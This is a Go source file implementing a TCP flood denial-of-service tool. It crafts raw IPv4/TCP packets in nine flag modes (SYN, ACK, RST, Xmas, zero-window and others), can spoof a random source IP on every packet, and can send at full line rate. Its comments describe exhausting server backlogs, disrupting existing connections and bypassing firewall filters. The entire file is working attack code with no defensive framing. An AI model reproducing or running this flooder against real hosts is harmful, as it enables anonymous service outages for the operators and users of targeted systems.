// Package tcpflood implements TCP-layer flood attacks.
//
// A raw AF_INET/SOCK_RAW/IPPROTO_RAW socket is used so the
// kernel handles routing and Ethernet framing.  We build the IPv4 header and
// the TCP segment from scratch (saddr+daddr+proto+len prepended to the segment, then one's
// complement sum over the combined buffer).
//
// Nine flood modes are supported, each differing in TCP flags and connection
// state semantics:
//
//	SYN          — half-open connection flood; exhausts server backlog
//	ACK          — forces RST from stateful firewalls; bypass ACK filters
//	RST          — disrupts existing connections
//	PSH+ACK      — data push flood, triggers processing overhead
//	ZeroWindow   — SYN with window=0; forces server to hold data forever
//	NULL         — no flags; confuses stateful inspection
//	OutOfOrder   — PSH+ACK with random seq/ack; stresses TCP reassembly buffers
//	Xmas         — FIN+PSH+URG; classic Xmas tree scan / flood
//	FIN          — FIN flood; confuses half-closed state machines
package tcpflood

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"sync/atomic"
	"time"
)

const (
	tcpFloodTag = "\x1b[33m[TCP]\x1b[0m" // light brown / dark-yellow

	// TCP flag bits
	tcpFIN = byte(0x01)
	tcpSYN = byte(0x02)
	tcpRST = byte(0x04)
	tcpPSH = byte(0x08)
	tcpACK = byte(0x10)
	tcpURG = byte(0x20)
)

// Mode selects which TCP flag pattern and connection behaviour to flood with.
type Mode int

const (
	ModeSYN         Mode = iota // SYN flood
	ModeACK                     // ACK flood
	ModeRST                     // RST flood
	ModePSH                     // PSH+ACK flood
	ModeZeroWindow              // SYN + window=0
	ModeNULL                    // no flags (null flood)
	ModeOutOfOrder              // PSH+ACK with random seq/ack
	ModeXmas                    // FIN+PSH+URG
	ModeFIN                     // FIN flood
)

func (m Mode) String() string {
	switch m {
	case ModeSYN:
		return "SYN"
	case ModeACK:
		return "ACK"
	case ModeRST:
		return "RST"
	case ModePSH:
		return "PSH+ACK"
	case ModeZeroWindow:
		return "SYN+ZeroWindow"
	case ModeNULL:
		return "NULL (no flags)"
	case ModeOutOfOrder:
		return "OutOfOrder PSH+ACK"
	case ModeXmas:
		return "Xmas FIN+PSH+URG"
	case ModeFIN:
		return "FIN"
	}
	return "unknown"
}

// rawSocket is satisfied by the platform-specific AF_INET implementation.
type rawSocket interface {
	Send(pkt []byte) error
	Close() error
}

// Flooder sends TCP packets in the chosen mode until Count packets are sent
// or Ctrl+C is pressed.
type Flooder struct {
	Interface    string
	Target       string // IPv4 address or hostname
	Port         uint16 // destination TCP port
	Mode         Mode
	Count        int  // 0 = unlimited
	Rate         int  // pps; 0 = full hardware speed
	RandomSource bool // spoof a random source IP every packet
}

// Run resolves the target, opens the raw socket, and floods.
func (f *Flooder) Run() error {
	dstIP, err := resolveIPv4(f.Target)
	if err != nil {
		return fmt.Errorf("target %q: %w", f.Target, err)
	}

	var srcIP [4]byte
	if !f.RandomSource {
		srcIP, err = interfaceIPv4(f.Interface)
		if err != nil {
			return fmt.Errorf("source IP on %s: %w (try --random-source)", f.Interface, err)
		}
	}

	iface, err := net.InterfaceByName(f.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", f.Interface, err)
	}

	sock, err := openRawSocket(iface, dstIP)
	if err != nil {
		return err
	}
	defer sock.Close()

	var total int64

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped. Total packets sent: %d\n", tcpFloodTag, atomic.LoadInt64(&total))
		os.Exit(0)
	}()

	go func() {
		t := time.NewTicker(time.Second)
		defer t.Stop()
		var prev int64
		for range t.C {
			cur := atomic.LoadInt64(&total)
			fmt.Printf("\r%s Total: %-12d  Rate: %-8d pps    ", tcpFloodTag, cur, cur-prev)
			prev = cur
		}
	}()

	src := "fixed source"
	if f.RandomSource {
		src = "random source"
	}
	if f.Count > 0 {
		fmt.Printf("%s Sending %d TCP %s packets → %s:%d (%s) — press Ctrl+C to stop.\n",
			tcpFloodTag, f.Count, f.Mode, f.Target, f.Port, src)
	} else {
		fmt.Printf("%s Flooding %s:%d with TCP %s (%s) — press Ctrl+C to stop.\n",
			tcpFloodTag, f.Target, f.Port, f.Mode, src)
	}

	var interval time.Duration
	if f.Rate > 0 {
		interval = time.Second / time.Duration(f.Rate)
	}
	next := time.Now()

	for {
		if f.Rate > 0 {
			if now := time.Now(); now.Before(next) {
				time.Sleep(next.Sub(now))
			}
			next = next.Add(interval)
		}

		if f.RandomSource {
			srcIP = randIPv4()
		}

		_ = sock.Send(buildPacket(srcIP, dstIP, f.Port, f.Mode))
		n := atomic.AddInt64(&total, 1)

		if f.Count > 0 && n >= int64(f.Count) {
			fmt.Printf("\n%s Done. Sent %d TCP %s packets to %s:%d.\n",
				tcpFloodTag, n, f.Mode, f.Target, f.Port)
			return nil
		}
	}
}

// buildPacket constructs one IPv4/TCP packet for the given flood mode.
//
// Wire layout (no Ethernet — sent via AF_INET SOCK_RAW):
//
//	[0:20]  IPv4 header  v=4 IHL=5 proto=TCP(6) TTL=64
//	[20:40] TCP header   sport(random) dport flags seq ack off window cksum
//
// Random source port and seq/ack per RFC 793,
// flags and window determined by the flood mode.
func buildPacket(srcIP, dstIP [4]byte, dstPort uint16, mode Mode) []byte {
	srcPort := randEphemeral()
	seq := randU32()
	ack := randU32()

	// Per-mode TCP field selection
	var flags  byte
	var window uint16 = 8192

	switch mode {
	case ModeSYN:
		flags, ack = tcpSYN, 0
	case ModeACK:
		flags = tcpACK
	case ModeRST:
		flags, ack = tcpRST, 0
	case ModePSH:
		flags = tcpPSH | tcpACK
	case ModeZeroWindow:
		flags, ack, window = tcpSYN, 0, 0
	case ModeNULL:
		flags, ack = 0, 0
	case ModeOutOfOrder:
		// PSH+ACK with fully random seq and ack — forces the server's TCP
		// reassembly engine to buffer unordered segments.
		flags = tcpPSH | tcpACK
	case ModeXmas:
		flags, ack = tcpFIN|tcpPSH|tcpURG, 0
	case ModeFIN:
		flags, ack = tcpFIN, 0
	}

	// TCP segment (20 bytes, no options).
	tcp := make([]byte, 20)
	binary.BigEndian.PutUint16(tcp[0:2], srcPort)
	binary.BigEndian.PutUint16(tcp[2:4], dstPort)
	binary.BigEndian.PutUint32(tcp[4:8], seq)
	binary.BigEndian.PutUint32(tcp[8:12], ack)
	tcp[12] = 0x50 // data offset = 5 (20 bytes / 4)
	tcp[13] = flags
	binary.BigEndian.PutUint16(tcp[14:16], window)
	// tcp[16:18] = checksum, filled below; tcp[18:20] = urgent pointer = 0
	binary.BigEndian.PutUint16(tcp[16:18], tcpChecksum(srcIP, dstIP, tcp))

	// IPv4 header (20 bytes).
	ipLen := 20 + len(tcp)
	pkt := make([]byte, ipLen)
	pkt[0] = 0x45 // version=4, IHL=5
	binary.BigEndian.PutUint16(pkt[2:4], uint16(ipLen))
	binary.BigEndian.PutUint16(pkt[4:6], randU16()) // IP ID
	// pkt[6:8] = flags/frag = 0
	pkt[8] = 64 // TTL
	pkt[9] = 6  // protocol = TCP
	// pkt[10:12] = checksum, filled below
	copy(pkt[12:16], srcIP[:])
	copy(pkt[16:20], dstIP[:])
	binary.BigEndian.PutUint16(pkt[10:12], onesCompSum(pkt[:20]))
	copy(pkt[20:], tcp)

	return pkt
}

// tcpChecksum computes the TCP checksum using the IPv4 pseudo-header, prepending 
// saddr+daddr+proto+len and checksumming the combined buffer.
func tcpChecksum(srcIP, dstIP [4]byte, tcpSeg []byte) uint16 {
	ph := make([]byte, 12+len(tcpSeg))
	copy(ph[0:4], srcIP[:])
	copy(ph[4:8], dstIP[:])
	// ph[8] = 0 (zero byte)
	ph[9] = 6 // TCP protocol number
	binary.BigEndian.PutUint16(ph[10:12], uint16(len(tcpSeg)))
	copy(ph[12:], tcpSeg)
	return onesCompSum(ph)
}

// onesCompSum computes the RFC 791 one's complement checksum (IP/TCP/ICMP).
func onesCompSum(data []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

func resolveIPv4(target string) ([4]byte, error) {
	ip := net.ParseIP(target)
	if ip == nil {
		hosts, err := net.LookupHost(target)
		if err != nil || len(hosts) == 0 {
			return [4]byte{}, fmt.Errorf("cannot resolve")
		}
		ip = net.ParseIP(hosts[0])
	}
	v4 := ip.To4()
	if v4 == nil {
		return [4]byte{}, fmt.Errorf("must be an IPv4 address")
	}
	var a [4]byte
	copy(a[:], v4)
	return a, nil
}

func interfaceIPv4(ifaceName string) ([4]byte, error) {
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		return [4]byte{}, err
	}
	addrs, err := iface.Addrs()
	if err != nil {
		return [4]byte{}, err
	}
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok {
			if v4 := ipNet.IP.To4(); v4 != nil {
				var a [4]byte
				copy(a[:], v4)
				return a, nil
			}
		}
	}
	return [4]byte{}, fmt.Errorf("no IPv4 address on interface %s", ifaceName)
}

func randIPv4() [4]byte {
	var ip [4]byte
	rand.Read(ip[:])
	return ip
}

func randU16() uint16 {
	var b [2]byte
	rand.Read(b[:])
	return binary.BigEndian.Uint16(b[:])
}

func randU32() uint32 {
	var b [4]byte
	rand.Read(b[:])
	return binary.BigEndian.Uint32(b[:])
}

// randEphemeral returns a random ephemeral source port in [32768, 60999].
func randEphemeral() uint16 {
	const (
		lo = 32768
		hi = 60999
	)
	return lo + randU16()%uint16(hi-lo+1)
}
